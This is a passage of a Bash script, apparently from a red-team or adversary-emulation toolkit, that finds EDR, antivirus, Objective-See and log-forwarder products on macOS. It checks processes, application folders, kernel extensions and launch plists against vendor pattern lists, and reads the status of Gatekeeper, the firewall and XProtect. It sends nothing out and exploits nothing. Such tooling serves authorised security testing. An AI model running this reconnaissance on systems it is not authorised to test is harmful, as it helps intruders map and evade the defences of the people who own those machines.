    core_debug_print "Checking for EDR processes"
    local output=""
    
    output+="[EDR Processes by Vendor]\n"
    for vendor_proc in "${EDR_VENDOR_PROC[@]}"; do
        # Split vendor name and process names
        local vendor_name="${vendor_proc%%:*}"
        local processes="${vendor_proc#*:}"
        
        # Convert comma-separated list to space-separated for iteration
        local process_list=$(echo "$processes" | tr ',' ' ')
        local found=false
        local vendor_output=""
        
        for proc in $process_list; do
            local proc_result=$(ps -axrww | grep -v grep | grep -i "$proc" 2>/dev/null)
            if [ -n "$proc_result" ]; then
                found=true
                vendor_output+="  - Found process: $proc\n"
                vendor_output+="$proc_result\n"
            fi
        done
        
        if [ "$found" = true ]; then
            output+="Vendor: $vendor_name\n"
            output+="$vendor_output\n"
        fi
    done
    
    # Additional process checks for common EDR patterns
    output+="\n[EDR-Related Process Detection by Pattern]\n"
    
    # Use global EDR_PATTERNS instead of redefining locally
    for pattern in "${EDR_PATTERNS[@]}"; do
        local pattern_result=$(ps -axrww | grep -v grep | grep -i "$pattern" 2>/dev/null)
        if [ -n "$pattern_result" ]; then
            output+="Detected potential EDR pattern: $pattern\n"
            output+="$pattern_result\n\n"
        fi
    done
    
    echo "$output"
}

# Discover EDR files
discover_edr_files() {
    core_debug_print "Checking for EDR application files and components"
    local output=""
    local found_something=false
    
    output+="[EDR Application Files Detection]\n"
    
    # Use global EDR_PATTERNS instead of defining a local array
    local edr_pattern_list=("${EDR_PATTERNS[@]}")
    
    # Convert to uppercase and add capitalized versions for checking file paths
    for pattern in "${EDR_PATTERNS[@]}"; do
        # Convert first letter to uppercase
        local capitalized=$(echo "$pattern" | awk '{print toupper(substr($0,1,1)) substr($0,2)}')
        edr_pattern_list+=("$capitalized")
    done
    
    # Use global SYSTEM_PATHS instead of redefining locally
    local system_paths=("${SYSTEM_PATHS[@]}")
    
    # First check for known EDR applications
    output+="[Known EDR Applications]\n"
    for app in "${EDR_VENDOR_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            found_something=true
            output+="Found EDR application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -10)\n\n"
        fi
    done
    
    if [ "$found_something" = false ]; then
        output+="No known EDR applications found in /Applications\n\n"
    fi
    
    # Check for EDR files in known locations using the global patterns
    output+="[EDR File Detection]\n"
    
    # Use the existing global EDR_PATTERNS array
    local matched_count=0
    
    # Check the predefined paths for EDR files
    for path in "${EDR_PATHS[@]}"; do
        # Skip wildcard paths and check concrete paths
        if [[ "$path" != *"*" ]] && [ -e "$path" ]; then
            found_something=true
            matched_count=$((matched_count + 1))
            output+="Found EDR component: $path\n"
        fi
    done
    
    # Check for EDR applications
    for app in "${EDR_VENDOR_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            found_something=true
            matched_count=$((matched_count + 1))
            output+="Found EDR application: $app\n"
        fi
    done
    
    if [ $matched_count -eq 0 ]; then
        output+="No EDR files found in common security paths.\n\n"
    fi
    
    # Check for launch agents and daemons related to EDR
    output+="[EDR Launch Agents and Daemons]\n"
    local launch_found=false
    # Use global LAUNCH_PATHS instead of hard-coding
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            for pattern in "${edr_pattern_list[@]}"; do
                matched_launches=$(find "$loc" -name "*$pattern*" 2>/dev/null)
                if [ -n "$matched_launches" ]; then
                    launch_found=true
                    found_something=true
                    output+="Found potential EDR launch files in $loc matching '$pattern':\n"
                    output+="$matched_launches\n"
                    
                    # Just report the file path without showing contents
                    output+="Found launch files related to EDR\n"
                fi
            done
        fi
    done
    
    if [ "$launch_found" = false ]; then
        output+="No EDR launch agents/daemons found\n\n"
    fi
    
    # Check kernel extensions for EDR components
    output+="[EDR Kernel Extensions]\n"
#TODO: turn this into afunction  - shhpould bea 
    # TODO: turn into functin and arg 
    kext_result=$(kextstat 2>/dev/null | grep -iE 'crowd|falcon|carbon|cb|sentinel|cylance|sophos|mcafee|fireeye|trend|xdr|cortex')
    if [ -n "$kext_result" ]; then
        found_something=true
        output+="Found EDR-related kernel extensions:\n"
        output+="$kext_result\n\n"
    else
        output+="No EDR-related kernel extensions found\n\n"
    fi
    
    # Check for config and log files
    output+="[EDR Configuration and Log Files]\n"
    local config_found=false
    # Use global EDR_LOG_PATHS instead of redefining locally
    
    for path in "${EDR_LOG_PATHS[@]}"; do
        if [ -e "$path" ]; then
            config_found=true
            found_something=true
            output+="Found EDR configuration/log directory: $path\n"
            output+="$(ls -la "$path" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    if [ "$config_found" = false ]; then
        output+="No EDR configuration or log files found\n\n"
    fi
    
    # Check for running processes related to security tools
    output+="[EDR Active Processes]\n"
    local proc_found=false
    for pattern in "${edr_pattern_list[@]}"; do
        proc_result=$(ps aux | grep -v grep | grep -i "$pattern" 2>/dev/null)
        if [ -n "$proc_result" ]; then
            proc_found=true
            found_something=true
            output+="Found process matching EDR pattern '$pattern':\n"
            output+="$proc_result\n\n"
        fi
    done
    
    if [ "$proc_found" = false ]; then
        output+="No active EDR processes detected\n\n"
    fi
    
    # Add a fallback message if nothing was found
    if [ "$found_something" = false ]; then
        output+="No EDR components were detected on this system using standard detection methods.\n"
        output+="This does not guarantee absence of security software, as some solutions use stealth techniques.\n\n"
    fi
    
    echo "$output"
}

# Discover EDR directories
discover_edr_dir() {
    core_debug_print "Checking directories for EDR products"
    local output=""
    
    output+="[EDR Directories in Applications]\n"
    for app in "${EDR_VENDOR_APP[@]}"; do
        app_path="/Applications/$app"
        if [ -d "$app_path" ]; then
            output+="Found EDR application directory: $app_path\n"
            output+="$(ls -la "$app_path" 2>/dev/null | head -n 10)\n"
            if [ -d "$app_path/Contents" ]; then
                output+="Contents directory exists\n"
                output+="$(ls -la "$app_path/Contents" 2>/dev/null | head -n 5)\n\n"
            fi
        fi
    done
    
    output+="\n[EDR Directories in System Paths]\n"
    for dir in "${EDR_VENDOR_DIR[@]}"; do
        if [ -d "$dir" ] || [ -f "$dir" ]; then
            output+="Found EDR path: $dir\n"
            output+="$(ls -la "$dir" 2>/dev/null | head -n 10)\n\n"
        fi
    done
    
    echo "$output"
}

# Discover EDR application info
discover_edr_info() {
    core_debug_print "Getting detailed info about EDR applications"
    local output=""
    
    output+="[EDR Application Detailed Information]\n"
    
    # First, check with system_profiler
    output+="System Profiler Application Data:\n"
    for app in "${EDR_VENDOR_APP[@]}"; do
        local app_name="${app%.app}"
        local app_info=$(system_profiler SPApplicationsDataType 2>/dev/null | grep -A 15 -i "$app_name")
        if [ -n "$app_info" ]; then
            output+="Application info for $app_name:\n$app_info\n\n"
        fi
    done
    
    # Check launch agents and daemons
    output+="\n[EDR Launch Agents and Daemons]\n"
    
    launch_locations=(
        "/Library/LaunchAgents"
        "/Library/LaunchDaemons"
        "/System/Library/LaunchAgents"
        "/System/Library/LaunchDaemons"
        "$HOME/Library/LaunchAgents"
    )
    
    for location in "${launch_locations[@]}"; do
        if [ -d "$location" ]; then
            for pattern in "crowd" "carbon" "sentinel" "cylance" "cortex" "defender" "sophos" "mcafee" "trend"; do
                launch_files=$(ls -la "$location"/*"$pattern"* 2>/dev/null)
                if [ -n "$launch_files" ]; then
                    output+="Found EDR launch files in $location matching '$pattern':\n"
                    output+="$launch_files\n"
                    
                    # Get content of first few files to analyze
                    matching_files=$(ls "$location"/*"$pattern"* 2>/dev/null | head -3)
                    if [ -n "$matching_files" ]; then
                        for file in $matching_files; do
                            output+="\nContents of $file:\n"
                            output+="$(head -20 "$file" 2>/dev/null)\n...\n"
                        done
                    fi
                    
                    output+="\n"
                fi
            done
        fi
    done
    
    # Check kexts (kernel extensions)
    output+="\n[EDR Kernel Extensions]\n"
    kextstat_result=$(kextstat 2>/dev/null | grep -iE 'crowd|carbon|sentinel|cylance|defender|sophos|mcafee|trend')
    if [ -n "$kextstat_result" ]; then
        output+="Found EDR-related kernel extensions:\n"
        output+="$kextstat_result\n\n"
    fi
    
    echo "$output"
}

# Security Software Detection Functions
# Each function is self-contained and performs a specific check

# Check for security processes
check_security_processes() {
    core_debug_print "Checking for security-related processes"
    local output=""
    output+="[Security Process Detection]\n"
    
    for process in "${SECURITY_PROCESSES[@]}"; do
        if pgrep -f "$process" > /dev/null; then
            output+="Security process: $process\n"
            output+="Process details: $(ps aux | grep -i "$process" | grep -v grep)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for security files and applications
check_security_files() {
    core_debug_print "Checking for security files and applications"
    local output=""
    output+="[Security File Detection]\n"
    
    for path in "${SECURITY_PATHS[@]}"; do
        if [ -f "$path" ]; then
            output+="Security file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for security directories
check_security_directories() {
    core_debug_print "Checking for security directories"
    local output=""
    output+="[Security Directory Detection]\n"
    
    for path in "${SECURITY_PATHS[@]}"; do
        if [ -d "$path" ]; then
            output+="Security directory: $path\n"
            output+="Directory info: $(ls -la "$path" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# GOOD CODE BLOCK: Consolidated function to check all security-related kexts
check_security_kexts() {
    core_debug_print "Checking for security-related kernel extensions"
    local output=""
    output+="[Security Kernel Extensions]\n"
    
    # Combine all security-related patterns from the global arrays
    local all_patterns=("${EDR_PATTERNS[@]}" "${AV_PATTERNS[@]}" "security" "protection")
    
    # Use our helper function to find kexts
    local kext_result=$(check_kexts_by_pattern "${all_patterns[@]}")
    
    # Format output based on results
    if [ -n "$kext_result" ]; then
        output+="Security-related kernel extensions detected:\n"
        output+="$kext_result\n\n"
    else
        output+="No security-related kernel extensions found\n\n"
    fi
    
    echo "$output"
}



# Check for security launch agents and daemons
check_security_launch_files() {
    core_debug_print "Checking for security-related launch agents and daemons"
    local output=""
    output+="[Security Launch Files]\n"
    
    # Build comprehensive pattern from all security-related patterns
    local edr_pattern=$(IFS="|"; echo "${EDR_PATTERNS[*]}")
    local av_pattern=$(IFS="|"; echo "${AV_PATTERNS[*]}")
    
    # Add Objective-See tool patterns (derived from app names)
    local ost_pattern="lulu|blockblock|oversight|donotdisturb|ransomwhere|knockknock"
    
    # Combine all patterns for a thorough search
    local combined_pattern="security|protection|$edr_pattern|$av_pattern|$ost_pattern"
    
    local found_launch=false
    
    # Search through all launch agent/daemon paths
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            local matched_launches=$(find "$loc" -type f -name "*.plist" 2>/dev/null | grep -iE "$combined_pattern")
            if [ -n "$matched_launches" ]; then
                found_launch=true
                output+="Found security-related launch files in $loc:\n"
                output+="$matched_launches\n\n"
            fi
        fi
    done
    
    if [ "$found_launch" = false ]; then
        output+="No security-related launch agents/daemons found\n\n"
    fi
    
    echo "$output"
}

# Check Gatekeeper status
check_gatekeeper() {
    core_debug_print "Checking Gatekeeper status"
    local output=""
    output+="[Gatekeeper Status]\n"
    
    if spctl --status | grep -q enabled; then
        output+="Gatekeeper: enabled\n"
        output+="Config: $(spctl --status)\n\n"
    else
        output+="Gatekeeper: disabled or not available\n\n"
    fi
    
    echo "$output"
}

# Check macOS Firewall status
check_firewall() {
    core_debug_print "Checking macOS Firewall status"
    local output=""
    output+="[Firewall Status]\n"
    
    if [ "$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null)" = "1" ]; then
        output+="Firewall: enabled\n"
        if command -v socketfilterfw >/dev/null 2>&1; then
            output+="Config: $(/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)\n"
        fi
        output+="\n"
    else
        output+="Firewall: disabled or not available\n\n"
    fi
    
    echo "$output"
}

# Check XProtect
check_xprotect() {
    core_debug_print "Checking XProtect status"
    local output=""
    output+="[XProtect Status]\n"
    
    local xprotect_file="/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist"
    if [ -f "$xprotect_file" ]; then
        output+="XProtect: present\n"
        output+="Config: $(defaults read "$xprotect_file" 2>/dev/null | head -5)\n\n"
    else
        output+="XProtect: not found\n\n"
    fi
    
    echo "$output"
}

# Check Malware Removal Tool
check_mrt() {
    core_debug_print "Checking Malware Removal Tool status"
    local output=""
    output+="[Malware Removal Tool Status]\n"
    
    local mrt_file="/System/Library/CoreServices/MRT.app/Contents/Info.plist"
    if [ -f "$mrt_file" ]; then
        output+="Malware Removal Tool: present\n"
        output+="Version: $(defaults read "$mrt_file" CFBundleVersion 2>/dev/null)\n\n"
    else
        output+="Malware Removal Tool: not found\n\n"
    fi
    
    echo "$output"
}

# Check Transparency, Consent, and Control (TCC) database
check_tcc() {
    core_debug_print "Checking TCC database"
    local output=""
    output+="[TCC Database Status]\n"
    
    local tcc_file="/Library/Application Support/com.apple.TCC/TCC.db"
    if [ -f "$tcc_file" ]; then
        output+="TCC Database: present\n"
        output+="File: $tcc_file\n\n"
    else
        output+="TCC Database: not found\n\n"
    fi
    
    echo "$output"
}

# Let's create EDR-specific check functions first

# Check for EDR processes
# BAD CODE BLOCK: Creates local lists instead of using global constants
# IMPROVED IMPLEMENTATION:
check_edr_processes() {
    core_debug_print "Checking for EDR processes"
    local output=""
    output+="[EDR Process Detection]\n"
    
    # Use the helper function to check for EDR processes
    local edr_process_results=$(check_processes_by_list "${EDR_PROCESSES[@]}")
    
    if [ -n "$edr_process_results" ]; then
        output+="$edr_process_results\n"
    else
        output+="No EDR processes detected\n\n"
    fi
    
    # Check for vendor process pairs using the global EDR_VENDOR_PROC
    output+="\n[EDR Processes by Vendor]\n"
    local vendor_results=$(check_processes_by_vendor "${EDR_VENDOR_PROC[@]}")
    
    if [ -n "$vendor_results" ]; then
        output+="$vendor_results\n"
    else
        output+="No EDR vendor processes detected\n\n"
    fi
    
    echo "$output"
}

# Helper function to check processes from a list of process names
check_processes_by_list() {
    local output=""
    local processes=("$@")
    local found=false
    
    for process in "${processes[@]}"; do
        if pgrep -f "$process" > /dev/null; then
            found=true
            output+="Process detected: $process\n"
            output+="Process details: $(ps aux | grep -i "$process" | grep -v grep)\n\n"
        fi
    done
    
    if [ "$found" = true ]; then
        echo "$output"
    fi
}

# Helper function to check processes by vendor pairs
check_processes_by_vendor() {
    local output=""
    local vendor_pairs=("$@")
    local found_any=false
    
    for vendor_proc in "${vendor_pairs[@]}"; do
        # Split vendor name and process names
        local vendor_name="${vendor_proc%%:*}"
        local processes="${vendor_proc#*:}"
        
        # Convert comma-separated list to space-separated for iteration
        local process_list=$(echo "$processes" | tr ',' ' ')
        local found=false
        local vendor_output=""
        
        for proc in $process_list; do
            local proc_result=$(ps -axrww | grep -v grep | grep -i "$proc" 2>/dev/null)
            if [ -n "$proc_result" ]; then
                found=true
                found_any=true
                vendor_output+="  - Found process: $proc\n"
                vendor_output+="$proc_result\n"
            fi
        done
        
        if [ "$found" = true ]; then
            output+="Vendor: $vendor_name\n"
            output+="$vendor_output\n"
        fi
    done
    
    if [ "$found_any" = true ]; then
        echo "$output"
    fi
}

# Check for EDR files
check_edr_files() {
    core_debug_print "Checking for EDR files"
    local output=""
    output+="[EDR File Detection]\n"
    
    for path in "${EDR_PATHS[@]}"; do
        # Handle wildcard paths
        if [[ "$path" == *"*" ]]; then
            # For wildcards, use find with pattern
            local base_path="${path%/*}"
            local pattern="${path##*/}"
            
            if [ -d "$base_path" ]; then
                local found_files=$(find "$base_path" -name "$pattern" -type f 2>/dev/null)
                if [ -n "$found_files" ]; then
                    output+="EDR file pattern: $path\n"
                    output+="$found_files\n\n"
                fi
            fi
        elif [ -f "$path" ]; then
            output+="EDR file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    # Check for EDR applications
    for app in "${EDR_VENDOR_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            output+="EDR application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for EDR directories
check_edr_directories() {
    core_debug_print "Checking for EDR directories"
    local output=""
    output+="[EDR Directory Detection]\n"
    
    for path in "${EDR_PATHS[@]}"; do
        # Skip wildcard patterns and check only directories
        if [[ "$path" != *"*" ]] && [ -d "$path" ]; then
            output+="EDR directory found: $path\n\n"
        fi
    done
    
    echo "$output"
}

# Check for EDR kernel extensions
# GOOD CODE BLOCK: Function uses global arrays and follows a clean pattern
check_edr_kexts() {
    core_debug_print "Checking for EDR-related kernel extensions"
    local output=""
    output+="[EDR Kernel Extensions]\n"
    
    # Check for kernel extensions related to EDR
    local kext_result=$(check_kexts_by_pattern "${EDR_PATTERNS[@]}")
    
    if [ -n "$kext_result" ]; then
        output+="EDR kernel extensions found:\n"
        output+="$kext_result\n\n"
    else
        output+="No EDR-related kernel extensions found\n\n"
    fi
    
    echo "$output"
}

# Helper function to check kernel extensions by pattern array
# Takes an array of patterns as arguments
check_kexts_by_pattern() {
    local patterns=("$@")
    local pattern_string=$(printf "%s|" "${patterns[@]}" | sed 's/|$//')
    kextstat 2>/dev/null | grep -iE "$pattern_string"
}

# Check for EDR launch agents and daemons
check_edr_launch_files() {
    core_debug_print "Checking for EDR-related launch agents and daemons"
    local output=""
    output+="[EDR Launch Files]\n"
    
    # Create pattern from EDR patterns
    local pattern=$(IFS="|"; echo "${EDR_PATTERNS[*]}")
    local found_launch=false
    
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            local matched_launches=$(find "$loc" -type f -name "*.plist" 2>/dev/null | grep -iE "$pattern")
            if [ -n "$matched_launches" ]; then
                found_launch=true
                output+="Found EDR-related launch files in $loc:\n"
                output+="$matched_launches\n\n"
            fi
        fi
    done
    
    if [ "$found_launch" = false ]; then
        output+="No EDR-related launch agents/daemons found\n\n"
    fi
    
    echo "$output"
}

# Get detailed info about EDR applications
check_edr_info() {
    core_debug_print "Getting detailed information about EDR applications"
    local output=""
    output+="[EDR Detailed Information]\n"
    
    # Check for EDR applications and just report their existence
    for app in "${EDR_VENDOR_APP[@]}"; do
        local app_name="${app%.app}"
        if system_profiler SPApplicationsDataType 2>/dev/null | grep -q -i "$app_name"; then
            output+="Found EDR application: $app_name\n"
        fi
    done
    
    echo "$output"
}

# Main EDR discovery function that calls the appropriate check functions
discover_edr() {
    local discover_type="$1"
    core_debug_print "EDR detection started with type: $discover_type"
    local output=""
    
    case "$discover_type" in
        ps)
            # Check for EDR processes only
            output+=$(check_edr_processes)
            ;;
        files)
            # Check for EDR files only
            output+=$(check_edr_files)
            ;;
        dir)
            # Check for EDR directories only
            output+=$(check_edr_directories)
            ;;
        info)
            # Get detailed info about EDR applications only
            output+=$(check_edr_info)
            output+=$(check_edr_kexts)
            output+=$(check_edr_launch_files)
            ;;
        all|*)
            # Run all EDR-specific checks
            output+=$(check_edr_processes)
            output+=$(check_edr_files)
            output+=$(check_edr_directories)
            output+=$(check_edr_kexts)
            output+=$(check_edr_launch_files)
            output+=$(check_edr_info)
            ;;
    esac
    
    # Add a summary if we found anything
    if echo "$output" | grep -q "found\|EDR\|detected"; then
        output+="\n[Summary]\nEDR tools detected on this system.\n"
    else
        output+="\n[Summary]\nNo common EDR tools detected.\n"
    fi
    
    echo "$output"
}

# AV Detection functions

# Check for AV processes
# BAD CODE BLOCK: Duplicates process checking logic again
# IMPROVED IMPLEMENTATION:
check_av_processes() {
    core_debug_print "Checking for AV processes"
    local output=""
    output+="[Antivirus Process Detection]\n"
    
    # Use the helper function to check for AV processes
    # We don't have a global AV_PROCESSES array, but we can extract them from vendor pairs
    local av_process_results=""
    
    # First check if there's a global AV_PROCESSES array defined
    if [ ${#AV_PROCESSES[@]} -gt 0 ]; then
        av_process_results=$(check_processes_by_list "${AV_PROCESSES[@]}")
    else
        # If not defined, extract from vendor pairs as fallback
        local extracted_processes=$(extract_processes_from_vendor_pairs "${AV_VENDOR_PROC[@]}")
        av_process_results=$(check_processes_by_list $extracted_processes)
    fi
    
    if [ -n "$av_process_results" ]; then
        output+="$av_process_results\n"
    else
        output+="No AV processes detected\n\n"
    fi
    
    # Check for vendor process pairs
    output+="\n[Antivirus Processes by Vendor]\n"
    local vendor_results=$(check_processes_by_vendor "${AV_VENDOR_PROC[@]}")
    
    if [ -n "$vendor_results" ]; then
        output+="$vendor_results\n"
    else
        output+="No AV vendor processes detected\n\n"
    fi
    
    echo "$output"
}

# Helper function to extract process names from vendor pairs
extract_processes_from_vendor_pairs() {
    local vendor_pairs=("$@")
    local all_processes=""
    
    for vendor_proc in "${vendor_pairs[@]}"; do
        # Get just the process names part after the colon
        local processes="${vendor_proc#*:}"
        # Replace commas with spaces
        local process_list=$(echo "$processes" | tr ',' ' ')
        # Add to our space-separated list
        all_processes="$all_processes $process_list"
    done
    
    echo "$all_processes"
}

# Check for AV files
check_av_files() {
    core_debug_print "Checking for AV files"
    local output=""
    output+="[Antivirus File Detection]\n"
    
    for path in "${AV_PATHS[@]}"; do
        # Handle wildcard paths
        if [[ "$path" == *"*" ]]; then
            # For wildcards, use find with pattern
            local base_path="${path%/*}"
            local pattern="${path##*/}"
            
            if [ -d "$base_path" ]; then
                local found_files=$(find "$base_path" -name "$pattern" -type f 2>/dev/null)
                if [ -n "$found_files" ]; then
                    output+="AV file pattern: $path\n"
                    output+="$found_files\n\n"
                fi
            fi
        elif [ -f "$path" ]; then
            output+="AV file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for AV applications
check_av_applications() {
    core_debug_print "Checking for AV applications"
    local output=""
    output+="[Antivirus Applications]\n"
    
    for app in "${AV_VENDOR_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            output+="AV application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for AV directories
check_av_directories() {
    core_debug_print "Checking for AV directories"
    local output=""
    output+="[Antivirus Directory Detection]\n"
    
    for path in "${AV_PATHS[@]}"; do
        # Skip wildcard patterns and check only directories
        if [[ "$path" != *"*" ]] && [ -d "$path" ]; then
            output+="AV directory found: $path\n\n"
        fi
    done
    
    echo "$output"
}

# Check for AV-related launch agents/daemons
check_av_launch_files() {
    core_debug_print "Checking for AV-related launch agents and daemons"
    local output=""
    output+="[Antivirus Launch Files]\n"
    
    # Create pattern from AV patterns
    local pattern=$(IFS="|"; echo "${AV_PATTERNS[*]}")
    local found_launch=false
    
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            local matched_launches=$(find "$loc" -type f -name "*.plist" 2>/dev/null | grep -iE "$pattern")
            if [ -n "$matched_launches" ]; then
                found_launch=true
                output+="Found AV-related launch files in $loc:\n"
                output+="$matched_launches\n\n"
            fi
        fi
    done
    
    if [ "$found_launch" = false ]; then
        output+="No AV-related launch agents/daemons found\n\n"
    fi
    
    echo "$output"
}

# Get detailed info about AV applications
check_av_info() {
    core_debug_print "Getting detailed information about AV applications"
    local output=""
    output+="[Antivirus Detailed Information]\n"
    
    # Check for AV applications and just report their existence
    for app in "${AV_VENDOR_APP[@]}"; do
        local app_name="${app%.app}"
        if system_profiler SPApplicationsDataType 2>/dev/null | grep -q -i "$app_name"; then
            output+="Found AV application: $app_name\n"
        fi
    done
    
    echo "$output"
}

# Main AV detection function
discover_av() {
    core_debug_print "Checking for Antivirus solutions"
    local output=""
    local discover_type="$1"  # Can be used to specify a particular check
    
    case "$discover_type" in
        ps)
            # Check for AV processes only
            output+=$(check_av_processes)
            ;;
        files)
            # Check for AV files only
            output+=$(check_av_files)
            ;;
        apps)
            # Check for AV applications only
            output+=$(check_av_applications)
            ;;
        dir)
            # Check for AV directories only
            output+=$(check_av_directories)
            ;;
        info)
            # Get detailed info about AV applications
            output+=$(check_av_info)
            output+=$(check_av_launch_files)
            ;;
        all|*)
            # Run all AV checks
            output+=$(check_av_processes)
            output+=$(check_av_files)
            output+=$(check_av_applications)
            output+=$(check_av_directories)
            output+=$(check_av_launch_files)
            output+=$(check_av_info)
                ;;
        esac
    
    # Add a summary if we found anything
    if echo "$output" | grep -q "found\|AV\|detected\|anti"; then
        output+="\n[Summary]\nAntivirus tools detected on this system.\n"
    else
        output+="\n[Summary]\nNo common Antivirus tools detected.\n"
    fi
    
    echo "$output"
}

# Objective-See Tools Detection functions

# BAD CODE BLOCK: Duplicates process checking logic that's already in helper functions
# IMPROVED IMPLEMENTATION:
check_ost_processes() {
    core_debug_print "Checking for Objective-See processes"
    local output=""
    output+="[Objective-See Process Detection]\n"
    
    # Use the helper function to check for Objective-See processes
    local ost_process_results=$(check_processes_by_list "${OST_PROCESSES[@]}")
    
    if [ -n "$ost_process_results" ]; then
        output+="$ost_process_results\n"
    else
        output+="No Objective-See processes detected\n\n"
    fi
    
    # Check for vendor process pairs
    output+="\n[Objective-See Processes by Tool]\n"
    local tool_results=$(check_processes_by_vendor "${OST_PROC[@]}")
    
    if [ -n "$tool_results" ]; then
        output+="$tool_results\n"
    else
        output+="No Objective-See tool processes detected\n\n"
    fi
    
    echo "$output"
}

# Check for Objective-See files and paths
check_ost_files() {
    core_debug_print "Checking for Objective-See files"
    local output=""
    output+="[Objective-See File Detection]\n"
    
    for path in "${OST_PATHS[@]}"; do
        if [ -f "$path" ]; then
            output+="Objective-See file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for Objective-See applications
check_ost_applications() {
    core_debug_print "Checking for Objective-See applications"
    local output=""
    output+="[Objective-See Applications]\n"
    
    for app in "${OST_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            output+="Objective-See application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for Objective-See directories
check_ost_directories() {
    core_debug_print "Checking for Objective-See directories"
    local output=""
    output+="[Objective-See Directory Detection]\n"
    
    for path in "${OST_PATHS[@]}"; do
        if [ -d "$path" ]; then
            output+="Objective-See directory found: $path\n\n"
        fi
    done
    
    echo "$output"
}

# Get detailed info about Objective-See applications
check_ost_info() {
    core_debug_print "Getting detailed information about Objective-See applications"
    local output=""
    output+="[Objective-See Detailed Information]\n"
    
    # Check for Objective-See applications and just report their existence
    for app in "${OST_APP[@]}"; do
        local app_name="${app%.app}"
        if system_profiler SPApplicationsDataType 2>/dev/null | grep -q -i "$app_name"; then
            output+="Found Objective-See application: $app_name\n"
        fi
    done
    
    echo "$output"
}

# Main Objective-See tools detection function
detect_objective_see_tools() {
    core_debug_print "Checking for Objective-See security tools"
    local output=""
    local discover_type="$1"  # Can be used to specify a particular check
    
    case "$discover_type" in
        ps)
            # Check for Objective-See processes only
            output+=$(check_ost_processes)
            ;;
        files)
            # Check for Objective-See files only
            output+=$(check_ost_files)
            ;;
        apps)
            # Check for Objective-See applications only
            output+=$(check_ost_applications)
            ;;
        dir)
            # Check for Objective-See directories only
            output+=$(check_ost_directories)
            ;;
        info)
            # Get detailed info about Objective-See applications
            output+=$(check_ost_info)
            ;;
        all|*)
            # Run all Objective-See checks
            output+=$(check_ost_processes)
            output+=$(check_ost_files)
            output+=$(check_ost_applications)
            output+=$(check_ost_directories)
            output+=$(check_ost_info)
            ;;
    esac
    
    # Add a summary if we found anything
    if echo "$output" | grep -q "found\|Objective-See\|detected"; then
        output+="\n[Summary]\nObjective-See security tools detected on this system.\n"
    else
        output+="\n[Summary]\nNo Objective-See security tools detected.\n"
    fi
    
    echo "$output"
}

#------------------------------------------------------------------------------
# Log Forwarder Detection Functions
#------------------------------------------------------------------------------

# Check for Log Forwarder processes
# BAD CODE BLOCK: Duplicates process checking logic again
# IMPROVED IMPLEMENTATION:
check_log_forwarder_processes() {
    core_debug_print "Checking for Log Forwarder processes"
    local output=""
    output+="[Log Forwarder Process Detection]\n"
    
    # Use the helper function to check for Log Forwarder processes
    local forwarder_process_results=$(check_processes_by_list "${LOG_FORWARDER_PROCESSES[@]}")
    
    if [ -n "$forwarder_process_results" ]; then
        output+="$forwarder_process_results\n"
    else
        output+="No Log Forwarder processes detected\n\n"
    fi
    
    # Check for vendor process pairs
    output+="\n[Log Forwarder Processes by Vendor]\n"
    local vendor_results=$(check_processes_by_vendor "${LOG_FORWARDER_VENDOR_PROC[@]}")
    
    if [ -n "$vendor_results" ]; then
        output+="$vendor_results\n"
    else
        output+="No Log Forwarder vendor processes detected\n\n"
    fi
    
    echo "$output"
}

# Check for Log Forwarder files
check_log_forwarder_files() {
    core_debug_print "Checking for Log Forwarder files"
    local output=""
    output+="[Log Forwarder File Detection]\n"
    
    for path in "${LOG_FORWARDER_PATHS[@]}"; do
        # Handle wildcard paths
        if [[ "$path" == *"*" ]]; then
            # For wildcards, use find with pattern
            local base_path="${path%/*}"
            local pattern="${path##*/}"
            
            if [ -d "$base_path" ]; then
                local found_files=$(find "$base_path" -name "$pattern" -type f 2>/dev/null)
                if [ -n "$found_files" ]; then
                    output+="Log Forwarder file pattern: $path\n"
                    output+="$found_files\n\n"
                fi
            fi
        elif [ -f "$path" ]; then
            output+="Log Forwarder file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null)\n\n"
            
            # Just report that a configuration file was found
            if echo "$path" | grep -q -E '\.conf$|\.cfg$|\.plist$'; then
                output+="Found configuration file\n\n"
            fi
        fi
    done
    
    # Check for Log Forwarder applications
    for app in "${LOG_FORWARDER_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            output+="Log Forwarder application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for Log Forwarder directories
check_log_forwarder_directories() {
    core_debug_print "Checking for Log Forwarder directories"
    local output=""
    output+="[Log Forwarder Directory Detection]\n"
    
    for path in "${LOG_FORWARDER_PATHS[@]}"; do
        # Skip wildcard patterns and check only directories
